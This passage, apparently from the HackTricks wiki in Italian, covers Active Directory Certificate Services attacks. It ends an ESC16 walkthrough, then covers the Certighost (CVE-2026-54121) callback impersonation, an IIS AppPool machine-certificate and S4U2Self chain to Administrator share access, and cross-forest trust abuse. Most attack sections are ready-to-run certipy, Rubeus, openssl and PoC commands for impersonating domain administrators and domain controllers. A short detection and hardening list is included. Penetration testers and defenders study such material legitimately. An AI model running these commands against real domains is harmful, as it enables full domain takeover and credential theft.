    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Passaggio 3: (Se necessario) Ottenere le credenziali dell'account "vittima" (ad esempio tramite Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: Richiedi un certificato come utente "vittima" da un template di autenticazione client a cui l'account può iscriversi (ad es. "User") sulla CA configurata con ESC16.** La CA omette l'estensione di sicurezza SID dal certificato rilasciato, ma questo da solo non stabilisce una mappatura di autenticazione utilizzabile. Imposta la variabile d'ambiente per la cache delle credenziali Kerberos (comando shell):

```bash
export KRB5CCNAME=victim.ccache
```

Quindi richiedi il certificato:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Passaggio 5: Ripristina l'UPN dell'account "vittima".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Passaggio 6: Su un KDC meno recente o in modalità di compatibilità che accetta questa mappatura debole, autenticati come amministratore di destinazione.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Sostituzione dell’identità tramite callback rogue LDAP/LSA chase (Certighost / CVE-2026-54121)

### Spiegazione

**Certighost** sfrutta un **percorso di enrollment chase / callback di AD CS** in cui la CA si fida degli attributi della richiesta forniti dal richiedente per determinare l’identità da inserire nel certificato rilasciato. Nel PoC pubblico, la richiesta appositamente creata include:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controllato dall’attaccante che la CA contatterà
- **`rmd`**: **nome DNS del Domain Controller target** da impersonare

Se la CA segue questo chase, si connetterà all’attaccante tramite **SMB/LSA (`445`)** e **LDAP (`389`)**. L’attaccante usa un **account computer reale** (di solito creato tramite il valore predefinito di **`ms-DS-MachineAccountQuota`**) affinché la sessione callback si autentichi come un principal di dominio valido, ma i servizi rogue restituiscono invece gli attributi d’identità del **DC target**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Se la CA **non associa crittograficamente l’identità restituita al principal callback autenticato**, può rilasciare un certificato per il **Domain Controller**, anche se la sessione si è autenticata come l’account computer controllato dall’attaccante. Questo rende il bug concettualmente diverso da **Certifried**: anziché riscrivere attributi AD come `dNSHostName`, l’attaccante **sostituisce i dati d’identità durante la risoluzione callback della CA**.<sup>[[2]](#references)</sup>

**Prerequisiti utili:**

- **Credenziali di dominio** con privilegi limitati
- Possibilità di **creare o riutilizzare un account computer**
- Raggiungibilità di rete dalla **CA** alle porte controllate dall’attaccante **`389` e `445`**
- Percorso di richiesta CA vulnerabile / non aggiornato (l’aggiornamento Microsoft del **14 luglio 2026** ha aggiunto la **convalida del DC per `cdc`** e un **confronto dei SID risolti**)

Il **`.pfx`** ottenuto può quindi essere usato per **PKINIT**, generando un **`.ccache`** e, nel flusso del PoC pubblicato, l’**hash NT del DC target**, normalmente sufficiente per la **compromissione completa del dominio**.

### Sfruttamento

Il PoC pubblico automatizza l’intera catena:<sup>[[1]](#references)</sup>

1. Creare o riutilizzare un **account computer** controllato dall’attaccante.
2. Avviare listener **LDAP e SMB/LSA rogue** sulle porte `389` e `445`.
3. Inviare una richiesta di certificato contenente gli attributi **`cdc`** controllato dall’attaccante e **`rmd`** del target.
4. Lasciare che la CA si autentichi ai listener rogue come account computer controllato, rispondendo però alle ricerche d’identità con gli attributi del **DC target**.
5. Ricevere un **certificato DC** firmato dalla CA e usarlo per **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Flag runtime utili dal PoC:

- `--listener <ip>`: scegli esplicitamente l'IP di callback annunciato in `cdc`
- `--computer-name <NAME$>`: riutilizza un account computer esistente invece di crearne uno nuovo

**Note operative:**

- Il PoC richiede **root** perché si associa alle **porte privilegiate** `389` e `445`.
- Un'exploitation riuscita scrive localmente un **DC `.pfx`** e un **Kerberos `.ccache`**.
- Poiché il certificato è associato a un account Domain Controller, le azioni successive possono includere **Kerberos auth basata su certificato**, **DCSync** e il riutilizzo dell'**hash NT della macchina** recuperato.<sup>[[2]](#references)</sup>

## Enrollment della macchina IIS AppPool verso Administrator sullo stesso host

Un pool IIS in esecuzione come `ApplicationPoolIdentity` usa l'**account computer** del suo host per l'accesso in uscita alle risorse di rete. Pertanto, l'esecuzione di codice come `IIS AppPool\<POOL>` resta a basso privilegio nel token locale, ma può inviare una richiesta AD CS che la CA autentica come `HOST$`; si tratta di una transizione dell'identità in uscita, non di impersonificazione del token né di un'elevazione locale in stile Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Questa chain richiede un host IIS aggiunto al dominio, una Enterprise CA raggiungibile tramite RPC, un template di autenticazione macchina pubblicato per il quale il computer disponga dei diritti di enrollment, supporto PKINIT e connettività KDC/SMB. Un'identità personalizzata del pool cambia il principal in uscita, quindi verifica che il pool usi davvero `ApplicationPoolIdentity` prima di presumere che sia `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment con chiave controllata dall'attaccante

Genera la coppia di chiavi e il CSR al di fuori del server IIS e conserva la chiave privata. Invia **solo il CSR** dal worker compromesso. Il [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) istanzia `CertificateAuthority.Request`, imposta `CertificateTemplate:Machine`, chiama `ICertRequest::Submit` e restituisce il certificato emesso. Usa la stringa di configurazione della CA `CAHOST\CA-NAME`; un normale template `Machine` crea il subject a partire da AD, quindi non sono necessari dati subject/SAN forniti dal richiedente.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combina il certificato restituito con la **chiave conservata corrispondente**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` funziona solo quando Windows può già associare il certificato a una chiave privata accessibile; per file PEM separati, crea esplicitamente un PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Usa il PFX per PKINIT e conserva il TGT del computer restituito in formato base64, invece di iniettarlo subito:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self più sostituzione del servizio sullo stesso host

S4U2Self consente a un servizio di ottenere un ticket **per sé stesso** contenente i dati di autorizzazione di un altro utente. Con il TGT del computer, Rubeus può richiedere quel ticket per un utente privilegiato, riscrivere il nome del servizio nel KRB-CRED restituito impostandolo su CIFS e iniettarlo. Questa è la primitiva locale “delegate to thyself”: non richiede S4U2Proxy né una voce `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Il ticket sostituito può essere usato solo dai servizi sullo **stesso account/chiave computer** (in questo caso, CIFS su `HOST`). Non è un ticket Administrator riutilizzabile su altre macchine del dominio. Inoltre, il risultato dimostrato consiste nell'accesso SMB/filesystem con privilegi di Administrator; per ottenere un processo locale `NT AUTHORITY\SYSTEM` è ancora necessario un passaggio separato di esecuzione remota.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Rilevamento e hardening

- Sulla CA, correlare gli eventi Certification Services **4886** (richiesta ricevuta) e **4887** (certificato emesso) per individuare richieste inattese di template `Machine` da parte di account di server IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Sui DC, l'evento **4768** include campi relativi ai certificati quando viene usata la pre-autenticazione tramite certificato; generare avvisi per richieste PKINIT TGT insolite relative ad account di web server. Verificare poi le richieste **4769** che coinvolgono un'identità privilegiata impersonata e lo stesso host. Poiché Rubeus `/altservice` riscrive lato client il nome del servizio in KRB-CRED, non richiedere che il nome del servizio 4769 lato DC sia `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Cercare `w3wp.exe` che raggiunge endpoint RPC della CA, creazione inattesa di file ASPX, accessi autenticati Kerberos a condivisioni amministrative e attività di estrazione di segreti. Ove possibile, limitare l'accesso dal livello applicativo a RPC della CA, KDC e SMB e rimuovere i diritti di enrollment dei computer o i template di autenticazione dei computer non necessari per le operazioni.<sup>[[19]](#references)</sup>

## Compromissione delle foreste con certificati, spiegata al passivo

### Interruzione dei trust tra foreste tramite CA compromesse

La configurazione dell'**enrollment tra foreste** è relativamente semplice. Il **certificato della CA radice** della foresta delle risorse viene **pubblicato nelle foreste degli account** dagli amministratori, mentre i certificati delle **CA enterprise** della foresta delle risorse vengono **aggiunti ai container `NTAuthCertificates` e AIA in ciascuna foresta degli account**. In altre parole, questa configurazione concede alla **CA nella foresta delle risorse il controllo completo** su tutte le altre foreste per cui gestisce la PKI. Se questa CA venisse **compromessa dagli attacker**, questi potrebbero **falsificare** certificati per tutti gli utenti delle foreste delle risorse e degli account, violando così il confine di sicurezza della foresta.<sup>[[6]](#references)</sup>

### Privilegi di enrollment concessi a principal esterni

Negli ambienti multi-foresta, è necessario prestare attenzione alle CA Enterprise che **pubblicano template di certificati** che consentono a **Authenticated Users o a principal esterni** (utenti/gruppi esterni alla foresta a cui appartiene la CA Enterprise) **diritti di enrollment e modifica**.\
Quando si autentica attraverso un trust, AD aggiunge il **SID Authenticated Users** al token dell'utente. Pertanto, se un dominio dispone di una CA Enterprise con un template che **concede a Authenticated Users i diritti di enrollment**, un utente di un'altra foresta potrebbe potenzialmente eseguire l'enrollment del template. Analogamente, se un template **concede esplicitamente i diritti di enrollment a un principal esterno**, viene così **creata una relazione di controllo degli accessi tra foreste**, che consente a un principal di una foresta di **eseguire l'enrollment di un template appartenente a un'altra foresta**.

Entrambi gli scenari comportano un **ampliamento della superficie di attacco** da una foresta all'altra. Un attacker potrebbe sfruttare le impostazioni del template di certificato per ottenere privilegi aggiuntivi in un dominio esterno.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repository PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Analisi tecnica di Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog di SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: abuso di Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, GUI di BloodHound, nuovi metodi di autenticazione e richiesta e altro](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: abuso della mappatura degli account Key Trust per l'acquisizione di account](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – La storia dell'uso (improprio) di Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying verso Active Directory Certificate Services tramite RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: accesso shell alla CA ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Tecnica di abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Tecnica di abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Escalatione dei privilegi (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: non è solo un altro AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: configurazione errata e sfruttamento](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Riconsiderando “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC di enrollment IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Escalatione dei privilegi da IIS AppPool tramite l'endpoint RPC di AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identità dei pool di applicazioni](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – comando pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Verifica dei Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Evento 4768: è stato richiesto un ticket di autenticazione Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Evento 4769: è stato richiesto un ticket di servizio Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – toolkit di sfruttamento PowerShell AD CS](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
